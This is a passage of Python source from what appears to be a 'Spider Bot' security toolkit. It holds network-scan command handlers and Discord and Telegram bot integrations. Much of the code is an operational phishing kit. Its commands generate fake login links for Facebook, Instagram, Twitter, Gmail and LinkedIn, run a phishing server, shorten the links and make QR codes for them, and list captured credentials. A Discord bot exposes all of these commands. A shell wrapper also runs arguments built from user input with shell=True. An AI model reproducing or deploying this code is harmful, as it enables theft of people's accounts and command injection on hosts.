            })
        
        return self._create_result(False, result.output)
    
    def _execute_quick_scan(self, args: List[str]) -> Dict[str, Any]:
        """Quick scan with faster settings"""
        if not args:
            return self._create_result(False, "Usage: quick_scan <target>")
        
        target = args[0]
        ports = "1-1000"
        scan_type = "quick_scan"
        
        result = self.tools.nmap_scan(target, scan_type, ports)
        
        if result.success:
            open_ports = self._parse_nmap_output(result.output)
            
            scan_result = ScanResult(
                target=target,
                scan_type=scan_type,
                open_ports=open_ports,
                timestamp=datetime.datetime.now().isoformat(),
                success=True
            )
            self.db.log_scan(scan_result)
            
            return self._create_result(True, {
                'target': target,
                'scan_type': "Quick Scan",
                'ports_scanned': ports,
                'open_ports': open_ports,
                'output': result.output[-1500:]  # Shorter output for quick scan
            })
        
        return self._create_result(False, result.output)
    
    def _execute_nmap(self, args: List[str]) -> Dict[str, Any]:
        """Full nmap command with all options"""
        if not args:
            return self._create_result(False, "Usage: nmap <target> [options]")
        
        target = args[0]
        # Join all arguments except target
        options = ' '.join(args[1:]) if len(args) > 1 else ""
        
        # Determine scan type from options
        scan_type = "custom"
        if '-A' in options or '-sV' in options:
            scan_type = "comprehensive"
        elif '-sS' in options and 'T2' in options:
            scan_type = "stealth"
        elif '-sU' in options:
            scan_type = "udp"
        elif '-O' in options:
            scan_type = "os_detection"
        
        # Execute nmap
        result = self._execute_generic(f"nmap {target} {options}")
        
        if result['success']:
            open_ports = self._parse_nmap_output(result['output'])
            
            scan_result = ScanResult(
                target=target,
                scan_type=scan_type,
                open_ports=open_ports,
                timestamp=datetime.datetime.now().isoformat(),
                success=True
            )
            self.db.log_scan(scan_result)
            
            result['data'] = {
                'target': target,
                'scan_type': scan_type,
                'options': options,
                'open_ports': open_ports
            }
        
        return result
    
    def _execute_full_scan(self, args: List[str]) -> Dict[str, Any]:
        """Full port scan (all ports)"""
        if not args:
            return self._create_result(False, "Usage: full_scan <target>")
        
        target = args[0]
        scan_type = "full"
        
        result = self.tools.nmap_scan(target, scan_type)
        
        if result.success:
            open_ports = self._parse_nmap_output(result.output)
            
            scan_result = ScanResult(
                target=target,
                scan_type=scan_type,
                open_ports=open_ports,
                timestamp=datetime.datetime.now().isoformat(),
                success=True
            )
            self.db.log_scan(scan_result)
            
            return self._create_result(True, {
                'target': target,
                'scan_type': "Full Scan (All Ports)",
                'open_ports': open_ports,
                'output': result.output[-3000:]  # Larger output for full scan
            })
        
        return self._create_result(False, result.output)
    
    def _parse_nmap_output(self, output: str) -> List[Dict]:
        """Parse nmap output for open ports"""
        open_ports = []
        lines = output.split('\n')
        
        for line in lines:
            if '/tcp' in line or '/udp' in line:
                parts = line.split()
                if len(parts) >= 3:
                    port_proto = parts[0].split('/')
                    if len(port_proto) == 2:
                        try:
                            port = int(port_proto[0])
                            protocol = port_proto[1]
                            state = parts[1] if len(parts) > 1 else 'unknown'
                            service = parts[2] if len(parts) > 2 else 'unknown'
                            
                            if state.lower() == 'open':
                                open_ports.append({
                                    'port': port,
                                    'protocol': protocol,
                                    'service': service,
                                    'state': state
                                })
                        except ValueError:
                            continue
        
        return open_ports
    
    def _execute_portscan(self, args: List[str]) -> Dict[str, Any]:
        return self._execute_scan(args)
    
    def _execute_traceroute(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: traceroute <target>")
        
        target = args[0]
        result = self.tools.traceroute(target)
        return self._create_result(result.success, result.output)
    
    def _execute_tracepath(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: tracepath <target>")
        
        return self._execute_generic('tracepath ' + ' '.join(args))
    
    def _execute_curl(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: curl <url> [options]")
        
        url = args[0]
        method = 'GET'
        
        if len(args) > 1:
            for i in range(1, len(args)):
                if args[i] == '-X' and i + 1 < len(args):
                    method = args[i + 1].upper()
        
        result = self.tools.curl_request(url, method)
        return self._create_result(result.success, result.output)
    
    def _execute_wget(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: wget <url>")
        
        return self._execute_generic('wget ' + ' '.join(args))
    
    def _execute_http(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: http <url>")
        
        url = args[0]
        try:
            response = requests.get(url, timeout=10)
            result = {
                'status': response.status_code,
                'headers': dict(response.headers),
                'body': response.text[:500] + ('...' if len(response.text) > 500 else ''),
                'size': len(response.content)
            }
            return self._create_result(True, result)
        except Exception as e:
            return self._create_result(False, f"HTTP request failed: {e}")
    
    def _execute_whois(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: whois <domain>")
        
        target = args[0]
        result = self.tools.whois_lookup(target)
        return self._create_result(result.success, result.output)
    
    def _execute_dig(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: dig <domain>")
        
        target = args[0]
        result = self.tools.dns_lookup(target)
        return self._create_result(result.success, result.output)
    
    def _execute_dns(self, args: List[str]) -> Dict[str, Any]:
        return self._execute_dig(args)
    
    def _execute_location(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: location <ip>")
        
        target = args[0]
        result = self.tools.get_ip_location(target)
        return self._create_result(result['success'], result)
    
    def _execute_analyze(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: analyze <ip>")
        
        ip = args[0]
        
        # Comprehensive IP analysis
        analysis = {
            'ip': ip,
            'timestamp': datetime.datetime.now().isoformat(),
            'location': None,
            'threats': [],
            'recommendations': []
        }
        
        # Get location
        location = self.tools.get_ip_location(ip)
        if location['success']:
            analysis['location'] = location
        
        # Check if IP is in threat database
        threats = self.db.get_recent_threats(50)
        ip_threats = [t for t in threats if t.get('source_ip') == ip]
        if ip_threats:
            analysis['threats'].extend([
                f"Previous threat: {t.get('threat_type')} ({t.get('severity')})" 
                for t in ip_threats[:3]
            ])
        
        # Add recommendations based on analysis
        if ip_threats:
            analysis['recommendations'].append("This IP has been involved in previous threats - monitor closely")
        
        return self._create_result(True, analysis)
    
    def _execute_system(self, args: List[str]) -> Dict[str, Any]:
        """Get system information"""
        info = {
            'system': platform.system(),
            'release': platform.release(),
            'version': platform.version(),
            'hostname': socket.gethostname(),
            'cpu_count': psutil.cpu_count(),
            'cpu_percent': psutil.cpu_percent(interval=1),
            'memory': {
                'total': psutil.virtual_memory().total,
                'available': psutil.virtual_memory().available,
                'percent': psutil.virtual_memory().percent,
                'used': psutil.virtual_memory().used,
                'free': psutil.virtual_memory().free
            },
            'disk': {
                'total': psutil.disk_usage('/').total,
                'used': psutil.disk_usage('/').used,
                'free': psutil.disk_usage('/').free,
                'percent': psutil.disk_usage('/').percent
            },
            'boot_time': datetime.datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')
        }
        
        return self._create_result(True, info)
    
    def _execute_network(self, args: List[str]) -> Dict[str, Any]:
        """Get network information"""
        try:
            hostname = socket.gethostname()
            local_ip = self.tools.get_local_ip()
            interfaces = psutil.net_if_addrs()
            
            network_info = {
                'hostname': hostname,
                'local_ip': local_ip,
                'interfaces': {}
            }
            
            for iface, addrs in interfaces.items():
                network_info['interfaces'][iface] = []
                for addr in addrs:
                    network_info['interfaces'][iface].append({
                        'family': str(addr.family),
                        'address': addr.address
                    })
            
            return self._create_result(True, network_info)
        
        except Exception as e:
            return self._create_result(False, f"Failed to get network info: {e}")
    
    def _execute_status(self, args: List[str]) -> Dict[str, Any]:
        """Get system status"""
        status = {
            'timestamp': datetime.datetime.now().isoformat(),
            'cpu': f"{psutil.cpu_percent(interval=1)}%",
            'memory': f"{psutil.virtual_memory().percent}%",
            'disk': f"{psutil.disk_usage('/').percent}%",
            'uptime': str(datetime.datetime.now() - datetime.datetime.fromtimestamp(psutil.boot_time())),
            'network': {
                'bytes_sent': psutil.net_io_counters().bytes_sent,
                'bytes_recv': psutil.net_io_counters().bytes_recv
            }
        }
        
        return self._create_result(True, status)
    
    def _execute_monitor(self, args: List[str]) -> Dict[str, Any]:
        """Monitor related commands"""
        if not args:
            return self._create_result(False, "Usage: monitor <add|remove|list> <ip>")
        
        action = args[0].lower()
        
        if action == 'list':
            monitored = self.db.get_monitored_ips()
            return self._create_result(True, {
                'monitored_ips': monitored,
                'count': len(monitored)
            })
        
        elif action in ['add', 'remove'] and len(args) > 1:
            ip = args[1]
            try:
                ipaddress.ip_address(ip)  # Validate IP
                
                if action == 'add':
                    success = self.db.add_monitored_ip(ip, "Added via command")
                    msg = f"Added {ip} to monitoring"
                else:
                    # In a real implementation, you'd have a remove method
                    msg = f"Remove functionality not implemented in this version"
                    success = False
                
                return self._create_result(success, msg)
            except ValueError:
                return self._create_result(False, f"Invalid IP address: {ip}")
        
        return self._create_result(False, f"Unknown monitor action: {action}")
    
    def _execute_ps(self, args: List[str]) -> Dict[str, Any]:
        """Process list"""
        return self._execute_generic('ps aux' if len(args) == 0 else 'ps ' + ' '.join(args))
    
    def _execute_top(self, args: List[str]) -> Dict[str, Any]:
        """Top command"""
        return self._execute_generic('top -b -n 1' if len(args) == 0 else 'top ' + ' '.join(args))
    
    def _execute_threats(self, args: List[str]) -> Dict[str, Any]:
        """Get recent threats"""
        limit = 10
        if args:
            try:
                limit = int(args[0])
            except:
                pass
        
        threats = self.db.get_recent_threats(limit)
        return self._create_result(True, threats)
    
    def _execute_report(self, args: List[str]) -> Dict[str, Any]:
        """Generate security report"""
        # Get statistics
        stats = self.db.get_statistics()
        threats = self.db.get_recent_threats(50)
        
        # Count threats by severity
        high_threats = len([t for t in threats if t.get('severity') == 'high'])
        medium_threats = len([t for t in threats if t.get('severity') == 'medium'])
        low_threats = len([t for t in threats if t.get('severity') == 'low'])
        
        # System info
        cpu = psutil.cpu_percent(interval=1)
        mem = psutil.virtual_memory().percent
        disk = psutil.disk_usage('/').percent
        
        # Phishing stats
        phishing_links = self.db.get_phishing_links()
        captured_creds = self.db.get_captured_credentials()
        
        report = {
            'generated_at': datetime.datetime.now().isoformat(),
            'statistics': stats,
            'threat_summary': {
                'high': high_threats,
                'medium': medium_threats,
                'low': low_threats,
                'total': len(threats)
            },
            'system_status': {
                'cpu': cpu,
                'memory': mem,
                'disk': disk
            },
            'social_engineering': {
                'total_phishing_links': len(phishing_links),
                'total_captured_credentials': len(captured_creds),
                'active_links': len(self.social_tools.active_links)
            },
            'recommendations': []
        }
        
        # Add recommendations
        if high_threats > 0:
            report['recommendations'].append("Investigate high severity threats immediately")
        if cpu > 80:
            report['recommendations'].append("High CPU usage detected")
        if mem > 80:
            report['recommendations'].append("High memory usage detected")
        if len(captured_creds) > 0:
            report['recommendations'].append(f"{len(captured_creds)} credentials captured - review security")
        
        # Save report to file
        filename = f"security_report_{int(time.time())}.json"
        filepath = os.path.join(REPORT_DIR, filename)
        
        try:
            with open(filepath, 'w') as f:
                json.dump(report, f, indent=2)
            report['report_file'] = filepath
        except Exception as e:
            logger.error(f"Failed to save report: {e}")
        
        return self._create_result(True, report)
    
    def _execute_generic(self, command: str) -> Dict[str, Any]:
        """Execute generic shell command"""
        try:
            start_time = time.time()
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=60,
                encoding='utf-8',
                errors='ignore'
            )
            execution_time = time.time() - start_time
        
            return self._create_result(
                result.returncode == 0,
                result.stdout if result.stdout else result.stderr,
                execution_time
            )
        
        except subprocess.TimeoutExpired:
            return self._create_result(False, f"Command timed out after 60 seconds")
        except Exception as e:
            return self._create_result(False, f"Command execution failed: {e}")
    
    # Social Engineering Command Handlers
    def _execute_phishing_facebook(self, args: List[str]) -> Dict[str, Any]:
        """Generate Facebook phishing link"""
        result = self.social_tools.generate_phishing_link("facebook")
        return self._create_result(result['success'], result)
    
    def _execute_phishing_instagram(self, args: List[str]) -> Dict[str, Any]:
        """Generate Instagram phishing link"""
        result = self.social_tools.generate_phishing_link("instagram")
        return self._create_result(result['success'], result)
    
    def _execute_phishing_twitter(self, args: List[str]) -> Dict[str, Any]:
        """Generate Twitter phishing link"""
        result = self.social_tools.generate_phishing_link("twitter")
        return self._create_result(result['success'], result)
    
    def _execute_phishing_gmail(self, args: List[str]) -> Dict[str, Any]:
        """Generate Gmail phishing link"""
        result = self.social_tools.generate_phishing_link("gmail")
        return self._create_result(result['success'], result)
    
    def _execute_phishing_linkedin(self, args: List[str]) -> Dict[str, Any]:
        """Generate LinkedIn phishing link"""
        result = self.social_tools.generate_phishing_link("linkedin")
        return self._create_result(result['success'], result)
    
    def _execute_phishing_custom(self, args: List[str]) -> Dict[str, Any]:
        """Generate custom phishing link"""
        custom_url = args[0] if args else None
        result = self.social_tools.generate_phishing_link("custom", custom_url)
        return self._create_result(result['success'], result)
    
    def _execute_phishing_start(self, args: List[str]) -> Dict[str, Any]:
        """Start phishing server"""
        if not args:
            return self._create_result(False, "Usage: phishing_start_server <link_id> [port]")
        
        link_id = args[0]
        port = int(args[1]) if len(args) > 1 else 8080
        
        success = self.social_tools.start_phishing_server(link_id, port)
        if success:
            url = self.social_tools.get_server_url()
            return self._create_result(True, {
                'message': f"Phishing server started on {url}",
                'url': url,
                'port': port,
                'link_id': link_id
            })
        else:
            return self._create_result(False, f"Failed to start phishing server for link {link_id}")
    
    def _execute_phishing_stop(self, args: List[str]) -> Dict[str, Any]:
        """Stop phishing server"""
        self.social_tools.stop_phishing_server()
        return self._create_result(True, "Phishing server stopped")
    
    def _execute_phishing_status(self, args: List[str]) -> Dict[str, Any]:
        """Get phishing server status"""
        status = {
            'server_running': self.social_tools.phishing_server.running,
            'server_url': self.social_tools.get_server_url() if self.social_tools.phishing_server.running else None,
            'port': self.social_tools.phishing_server.port if self.social_tools.phishing_server.running else None,
            'active_link_id': self.social_tools.phishing_server.link_id if self.social_tools.phishing_server.running else None,
            'platform': self.social_tools.phishing_server.platform if self.social_tools.phishing_server.running else None
        }
        return self._create_result(True, status)
    
    def _execute_phishing_links(self, args: List[str]) -> Dict[str, Any]:
        """Get active phishing links"""
        active_links = self.social_tools.get_active_links()
        all_links = self.db.get_phishing_links()
        
        return self._create_result(True, {
            'active_links': active_links,
            'all_links': all_links,
            'total': len(all_links)
        })
    
    def _execute_phishing_credentials(self, args: List[str]) -> Dict[str, Any]:
        """Get captured credentials"""
        link_id = args[0] if args else None
        credentials = self.social_tools.get_captured_credentials(link_id)
        return self._create_result(True, credentials)
    
    def _execute_phishing_qr(self, args: List[str]) -> Dict[str, Any]:
        """Generate QR code for phishing link"""
        if not args:
            return self._create_result(False, "Usage: phishing_qr <link_id>")
        
        link_id = args[0]
        qr_path = self.social_tools.generate_qr_code(link_id)
        
        if qr_path:
            return self._create_result(True, {
                'message': f"QR code generated: {qr_path}",
                'path': qr_path
            })
        else:
            return self._create_result(False, f"Failed to generate QR code for link {link_id}")
    
    def _execute_phishing_shorten(self, args: List[str]) -> Dict[str, Any]:
        """Shorten phishing URL"""
        if not args:
            return self._create_result(False, "Usage: phishing_shorten <link_id>")
        
        link_id = args[0]
        short_url = self.social_tools.shorten_url(link_id)
        
        if short_url:
            return self._create_result(True, {
                'message': f"URL shortened: {short_url}",
                'short_url': short_url
            })
        else:
            return self._create_result(False, f"Failed to shorten URL for link {link_id}")
    
    def _execute_phishing_template(self, args: List[str]) -> Dict[str, Any]:
        """Manage phishing templates"""
        if not args:
            templates = self.db.get_phishing_templates()
            return self._create_result(True, templates)
        
        if args[0] == 'list':
            platform = args[1] if len(args) > 1 else None
            templates = self.db.get_phishing_templates(platform)
            return self._create_result(True, templates)
        
        elif args[0] == 'save' and len(args) >= 3:
            name = args[1]
            platform = args[2]
            # In a real implementation, you'd get HTML from file or argument
            html_content = self.social_tools._get_custom_template()
            success = self.db.save_phishing_template(name, platform, html_content)
            return self._create_result(success, f"Template {name} saved" if success else "Failed to save template")
        
        return self._create_result(False, "Unknown template command")

# =====================
# DISCORD BOT
# =====================
class SpiderBotDiscord:
    """Discord bot integration"""
    
    def __init__(self, command_handler: CommandHandler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.config = self.load_config()
        self.bot = None
        self.running = False
        self.task = None
    
    def load_config(self) -> Dict:
        """Load Discord configuration"""
        try:
            if os.path.exists(DISCORD_CONFIG_FILE):
                with open(DISCORD_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load Discord config: {e}")
        
        return {"token": "", "channel_id": "", "enabled": False, "prefix": "!"}
    
    def save_config(self, token: str, channel_id: str = "", enabled: bool = True, prefix: str = "!") -> bool:
        """Save Discord configuration"""
        try:
            config = {
                "token": token,
                "channel_id": channel_id,
                "enabled": enabled,
                "prefix": prefix
            }
            with open(DISCORD_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except Exception as e:
            logger.error(f"Failed to save Discord config: {e}")
            return False
    
    async def start(self):
        """Start Discord bot"""
        if not DISCORD_AVAILABLE:
            logger.error("discord.py not installed")
            return False
        
        if not self.config.get('token'):
            logger.error("Discord token not configured")
            return False
        
        try:
            intents = discord.Intents.default()
            intents.message_content = True
            
            self.bot = commands.Bot(
                command_prefix=self.config.get('prefix', '!'), 
                intents=intents,
                help_command=None
            )
            
            # Setup event handlers
            @self.bot.event
            async def on_ready():
                logger.info(f'Discord bot logged in as {self.bot.user}')
                print(f'{Colors.GREEN}✅ Discord bot connected as {self.bot.user}{Colors.RESET}')
                
                await self.bot.change_presence(
                    activity=discord.Activity(
                        type=discord.ActivityType.watching,
                        name="600+ Security Commands"
                    )
                )
            
            # Setup commands
            await self.setup_commands()
            
            self.running = True
            await self.bot.start(self.config['token'])
            return True
            
        except Exception as e:
            logger.error(f"Failed to start Discord bot: {e}")
            return False
    
    async def setup_commands(self):
        """Setup Discord commands"""
        
        @self.bot.command(name='help')
        async def help_command(ctx):
            """Show help"""
            embed = discord.Embed(
                title="🕸️ Spider Bot v.9.0.0 Help",
                description="**600+ Advanced Cybersecurity Commands**\n\nType `!command parameters` to use",
                color=discord.Color.blue()
            )
            
            embed.add_field(
                name="🤖 Basic Commands",
                value="`!ping <ip>` - Ping IP\n`!scan <ip>` - Port scan (1-1000)\n`!quick_scan <ip>` - Fast port scan\n`!nmap <ip> [options]` - Full nmap scan",
                inline=False
            )
            
            embed.add_field(
                name="🎣 Social Engineering",
                value="`!generate_phishing_link_for_facebook` - Facebook phishing\n`!generate_phishing_link_for_instagram` - Instagram phishing\n`!generate_phishing_link_for_custom` - Custom phishing\n`!phishing_start_server <id>` - Start server\n`!phishing_credentials` - View captured data",
                inline=False
            )
            
            embed.add_field(
                name="🔍 Information Gathering",
                value="`!whois <domain>` - WHOIS lookup\n`!dns <domain>` - DNS lookup\n`!location <ip>` - IP geolocation",
                inline=False
            )
            
            embed.add_field(
                name="📊 System Commands",
                value="`!system` - System info\n`!network` - Network info\n`!status` - System status\n`!threats` - Recent threats",
                inline=False
            )
            
            embed.add_field(
                name="💡 Examples",
                value="```!ping 8.8.8.8\n!scan 192.168.1.1\n!generate_phishing_link_for_facebook\n!phishing_start_server abc12345\n!phishing_credentials```",
                inline=False
            )
            
            await ctx.send(embed=embed)
        
        @self.bot.command(name='ping')
        async def ping_command(ctx, target: str, *options):
            """Ping command"""
            await ctx.send(f"🏓 Pinging {target}...")
            cmd = f"ping {target}"
            if options:
                cmd += " " + " ".join(options)
            result = self.handler.execute(cmd, "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='scan')
        async def scan_command(ctx, target: str, ports: str = None):
            """Port scan (1-1000 by default)"""
            await ctx.send(f"🔍 Scanning {target} (ports 1-1000)...")
            cmd = f"scan {target}"
            if ports:
                cmd += f" {ports}"
            result = self.handler.execute(cmd, "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='quick_scan')
        async def quick_scan_command(ctx, target: str):
            """Quick port scan"""
            await ctx.send(f"⚡ Quick scanning {target}...")
            result = self.handler.execute(f"quick_scan {target}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='nmap')
        async def nmap_command(ctx, target: str, *options):
            """Full nmap command"""
            await ctx.send(f"🔬 Running nmap on {target}...")
            cmd = f"nmap {target}"
            if options:
                cmd += " " + " ".join(options)
            result = self.handler.execute(cmd, "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='traceroute')
        async def traceroute_command(ctx, target: str):
            """Traceroute"""
            await ctx.send(f"🛣️ Tracing route to {target}...")
            result = self.handler.execute(f"traceroute {target}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='whois')
        async def whois_command(ctx, domain: str):
            """WHOIS lookup"""
            await ctx.send(f"🔎 WHOIS lookup for {domain}...")
            result = self.handler.execute(f"whois {domain}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='dns')
        async def dns_command(ctx, domain: str):
            """DNS lookup"""
            await ctx.send(f"📡 DNS lookup for {domain}...")
            result = self.handler.execute(f"dns {domain}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='location')
        async def location_command(ctx, ip: str):
            """IP geolocation"""
            await ctx.send(f"📍 Getting location for {ip}...")
            result = self.handler.execute(f"location {ip}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='system')
        async def system_command(ctx):
            """System info"""
            await ctx.send("💻 Getting system information...")
            result = self.handler.execute("system", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='status')
        async def status_command(ctx):
            """System status"""
            await ctx.send("📊 Getting system status...")
            result = self.handler.execute("status", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='threats')
        async def threats_command(ctx, limit: int = 10):
            """Recent threats"""
            threats = self.db.get_recent_threats(limit)
            
            if not threats:
                embed = discord.Embed(
                    title="🚨 Recent Threats",
                    description="✅ No recent threats detected",
                    color=discord.Color.green()
                )
                await ctx.send(embed=embed)
                return
            
            embed = discord.Embed(
                title=f"🚨 Recent Threats (Last {limit})",
                color=discord.Color.red(),
                timestamp=datetime.datetime.now()
            )
            
            for threat in threats:
                severity = threat.get('severity', 'unknown')
                embed.add_field(
                    name=f"{self.get_severity_emoji(severity)} {threat.get('threat_type', 'Unknown')}",
                    value=f"**Source:** `{threat.get('source_ip', 'Unknown')}`\n**Time:** {threat.get('timestamp', '')[:19]}",
                    inline=False
                )
            
            await ctx.send(embed=embed)
        
        @self.bot.command(name='report')
        async def report_command(ctx):
            """Security report"""
            await ctx.send("📊 Generating security report...")
            result = self.handler.execute("report", "discord")
            await self.send_result(ctx, result)
        
        # Social Engineering Commands
        @self.bot.command(name='generate_phishing_link_for_facebook')
        async def phishing_facebook_command(ctx):
            """Generate Facebook phishing link"""
            await ctx.send("🎣 Generating Facebook phishing link...")
            result = self.handler.execute("generate_phishing_link_for_facebook", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='generate_phishing_link_for_instagram')
        async def phishing_instagram_command(ctx):
            """Generate Instagram phishing link"""
            await ctx.send("🎣 Generating Instagram phishing link...")
            result = self.handler.execute("generate_phishing_link_for_instagram", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='generate_phishing_link_for_twitter')
        async def phishing_twitter_command(ctx):
            """Generate Twitter phishing link"""
            await ctx.send("🎣 Generating Twitter phishing link...")
            result = self.handler.execute("generate_phishing_link_for_twitter", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='generate_phishing_link_for_gmail')
        async def phishing_gmail_command(ctx):
            """Generate Gmail phishing link"""
            await ctx.send("🎣 Generating Gmail phishing link...")
            result = self.handler.execute("generate_phishing_link_for_gmail", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='generate_phishing_link_for_linkedin')
        async def phishing_linkedin_command(ctx):
            """Generate LinkedIn phishing link"""
            await ctx.send("🎣 Generating LinkedIn phishing link...")
            result = self.handler.execute("generate_phishing_link_for_linkedin", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='generate_phishing_link_for_custom')
        async def phishing_custom_command(ctx, custom_url: str = None):
            """Generate custom phishing link"""
            await ctx.send("🎣 Generating custom phishing link...")
            cmd = "generate_phishing_link_for_custom"
            if custom_url:
                cmd += f" {custom_url}"
            result = self.handler.execute(cmd, "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='phishing_start_server')
        async def phishing_start_command(ctx, link_id: str, port: int = 8080):
            """Start phishing server"""
            await ctx.send(f"🚀 Starting phishing server for link {link_id} on port {port}...")
            result = self.handler.execute(f"phishing_start_server {link_id} {port}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='phishing_stop_server')
        async def phishing_stop_command(ctx):
            """Stop phishing server"""
            await ctx.send("🛑 Stopping phishing server...")
            result = self.handler.execute("phishing_stop_server", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='phishing_status')
        async def phishing_status_command(ctx):
            """Phishing server status"""
            result = self.handler.execute("phishing_status", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='phishing_links')
        async def phishing_links_command(ctx):
            """List phishing links"""
            result = self.handler.execute("phishing_links", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='phishing_credentials')
        async def phishing_credentials_command(ctx, link_id: str = None):
            """View captured credentials"""
            cmd = "phishing_credentials"
            if link_id:
                cmd += f" {link_id}"
            result = self.handler.execute(cmd, "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='phishing_qr')
        async def phishing_qr_command(ctx, link_id: str):
            """Generate QR code for phishing link"""
            await ctx.send(f"📱 Generating QR code for link {link_id}...")
            result = self.handler.execute(f"phishing_qr {link_id}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='phishing_shorten')
        async def phishing_shorten_command(ctx, link_id: str):
            """Shorten phishing URL"""
            await ctx.send(f"🔗 Shortening URL for link {link_id}...")
            result = self.handler.execute(f"phishing_shorten {link_id}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='execute')
        @commands.has_permissions(administrator=True)
        async def execute_command(ctx, *, command: str):
            """Execute any command (Admin only)"""
            await ctx.send(f"⚡ Executing command...")
            result = self.handler.execute(command, "discord")
            await self.send_result(ctx, result)
    
    async def send_result(self, ctx, result: Dict[str, Any]):
        """Send command result to Discord"""
        if not result['success']:
            embed = discord.Embed(
                title="❌ Command Failed",
                description=f"```{result.get('output', 'Unknown error')[:1000]}```",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)
            return
        
        output = result.get('output', '') or result.get('data', '')
        
        if isinstance(output, dict):
            try:
                # Format dictionary output
                formatted = json.dumps(output, indent=2)
            except:
                formatted = str(output)
        else:
            formatted = str(output)
        
        # Truncate if too long
        if len(formatted) > 2000:
            formatted = formatted[:1900] + "\n\n... (output truncated)"
        
        # Create embed
        if result.get('data'):
            embed = discord.Embed(
                title=f"✅ Command Executed ({result['execution_time']:.2f}s)",
                color=discord.Color.green()
            )
            
            # Add fields for dictionary data
            if isinstance(result['data'], dict):
                for key, value in result['data'].items():
                    if key not in ['output'] and value:
                        if isinstance(value, list) and len(value) > 0:
                            # Handle lists (like open ports)
                            if isinstance(value[0], dict):
                                # Format list of dictionaries
                                formatted_list = "\n".join([str(v) for v in value[:5]])
                                if len(value) > 5:
                                    formatted_list += f"\n... and {len(value)-5} more"
                                embed.add_field(name=key, value=f"```{formatted_list[:500]}```", inline=False)
                            else:
                                embed.add_field(name=key, value=str(value)[:200], inline=True)
                        else:
                            embed.add_field(name=key, value=str(value)[:200], inline=True)
            
            await ctx.send(embed=embed)
            
            # Send additional output if needed
            if formatted and 'output' not in result.get('data', {}):
                if len(formatted) > 2000:
                    # Send as file if too long
                    file_content = f"Command Output:\n{formatted}"
                    with open(f"{TEMP_DIR}/discord_output_{ctx.message.id}.txt", "w") as f:
                        f.write(file_content)
                    await ctx.send(file=discord.File(f"{TEMP_DIR}/discord_output_{ctx.message.id}.txt"))
                    os.remove(f"{TEMP_DIR}/discord_output_{ctx.message.id}.txt")
                else:
                    await ctx.send(f"```{formatted}```")
        else:
            embed = discord.Embed(
                title=f"✅ Command Executed ({result['execution_time']:.2f}s)",
                description=f"```{formatted}```",
                color=discord.Color.green()
            )
            await ctx.send(embed=embed)
    
    def get_severity_emoji(self, severity: str) -> str:
        """Get emoji for threat severity"""
        if severity == 'high':
            return '🔴'
        elif severity == 'medium':
            return '🟡'
        elif severity == 'low':
            return '🟢'
        else:
            return '⚪'
    
    def start_bot_thread(self):
        """Start Discord bot in separate thread"""
        if self.config.get('enabled') and self.config.get('token'):
            thread = threading.Thread(target=self._run_discord_bot, daemon=True)
            thread.start()
            logger.info("Discord bot started in background thread")
            return True
        return False
    
    def _run_discord_bot(self):
        """Run Discord bot in thread"""
        try:
            asyncio.run(self.start())
        except Exception as e:
            logger.error(f"Discord bot error: {e}")

# =====================
# TELEGRAM BOT
# =====================
class SpiderBotTelegram:
    """Telegram bot integration"""
    
    def __init__(self, command_handler: CommandHandler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.config = self.load_config()
        self.client = None
        self.running = False
    
    def load_config(self) -> Dict:
        """Load Telegram configuration"""
        try:
            if os.path.exists(TELEGRAM_CONFIG_FILE):
                with open(TELEGRAM_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load Telegram config: {e}")
        
        return {
            "enabled": False,
            "api_id": "",
            "api_hash": "",
            "phone_number": "",
            "channel_id": ""
        }
    
    def save_config(self, api_id: str, api_hash: str, phone_number: str = "", 
                   channel_id: str = "", enabled: bool = True) -> bool:
        """Save Telegram configuration"""
        try:
            config = {
                "api_id": api_id,
                "api_hash": api_hash,
                "phone_number": phone_number,
                "channel_id": channel_id,
                "enabled": enabled
            }
            with open(TELEGRAM_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
